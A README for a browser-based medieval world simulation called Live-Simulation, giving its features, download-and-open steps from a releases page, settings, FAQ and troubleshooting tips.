# 🌍 Live-Simulation - Watch a medieval world come alive

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Totosh5285/Live-Simulation/releases)

Live-Simulation creates a digital medieval world. You watch citizens trade, build homes, and grow their civilization within your web browser. The simulation runs on its own. You observe the events as they happen in real time.

## 🛠 Features

*   **Autonomous Characters:** Every person in the village has a goal. They gather food, cut wood, and manage their daily lives without your input.
*   **Dynamic Weather:** The environment changes based on seasons. Rain, snow, and sun affect the survival of your civilization.
*   **Browser-Based:** You run the simulation directly in your internet browser. This requires no installation of heavy game files.
*   **Living History:** Events log automatically. You see what happens when kingdoms interact or when a plague strikes the population.

## 💻 System Requirements

You need a modern computer to run this simulation smoothly. Use one of these browsers:

*   Google Chrome
*   Mozilla Firefox
*   Microsoft Edge

Ensure your computer has at least 4GB of RAM. A stable internet connection helps the page load the simulation assets correctly.

## 📥 How to Run the Simulation

Follow these steps to launch the software on your Windows computer.

1. Visit the [Official Release Page](https://github.com/Totosh5285/Live-Simulation/releases).
2. Look for the latest version at the top of the list.
3. Click the file ending in .zip to save it to your device.
4. Locate the file in your Downloads folder.
5. Right-click the folder and select Extract All. 
6. Open the extracted folder.
7. Find the file named index.html.
8. Right-click this file and select Open With.
9. Choose your preferred web browser from the list.

The simulation will load in a new tab. You may see a loading bar while the application connects to the simulation data.

## ⚙️ Configuration Options

The simulation includes a settings menu. You find this button in the top right corner of the screen.

*   **Simulation Speed:** Adjust how fast time passes. Slow time down to watch specific events or speed it up to see decades of history in minutes.
*   **Event Log:** Toggle this to hide or show the text history occurring on the left sidebar.
*   **Graphics Quality:** If your computer runs hot or shows low frame rates, lower this setting to medium or low to improve performance.

## ❓ Frequently Asked Questions

**Does the simulation save my progress?**
No. The simulation performs a fresh start every time you refresh the browser page. It treats every session as a new history.

**Can I influence the characters?**
You act as an observer. You watch the development of the village. The artificial intelligence controls the decisions of the citizens.

**The browser seems slow. What should I do?**
Close other applications. Browsers use a lot of memory for simulations. A web browser with many open tabs often taxes your hardware. Closing unused tabs provides more system power to the simulation.

**What do the numbers at the bottom mean?**
The numbers track the population count, current season, year, and food reserves. These indicators confirm the health of the civilization.

## 🛡 Troubleshooting

If the simulation does not load, try these tasks:

*   Clear your browser cache. Corrupt temporary files block the startup process.
*   Update your browser. Old versions lack the features needed to process modern web graphics.
*   Disable browser extensions. Some blockers stop scripts from running. These scripts are necessary for the simulation to function.
*   Check for system updates on Windows. Graphics drivers require frequent updates to render browser content properly.

## 📈 Improving Performance

If you want to view a large population, follow these recommendations:

1. Use a desktop computer rather than a laptop. Desktops handle heat better and allow the processor to run at higher speeds for longer periods.
2. Keep your laptop plugged into a power source. Laptops often limit speed when running on battery power.
3. Use a wired internet connection. Wi-Fi signals fluctuate and lead to slow asset loading.
4. Ensure hardware acceleration is active in your browser settings. This setting tells your computer to use the graphics card instead of the main processor to draw the village.
